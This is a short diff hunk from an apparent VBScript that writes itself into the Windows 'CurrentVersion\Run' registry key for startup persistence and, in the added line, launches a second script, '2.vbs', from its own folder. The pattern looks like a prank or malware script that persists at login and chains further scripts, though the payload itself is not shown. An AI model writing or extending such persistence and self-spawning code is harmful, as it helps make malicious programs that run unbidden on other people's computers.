@@ -9,6 +9,7 @@ shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
 path1=WScript.ScriptFullName
 path2=WScript.ScriptName
 path=Replace(path1,path2,"")
+shell.run path+"2.vbs"
 stupid=Null
 WScript.Sleep 500
 ch=5
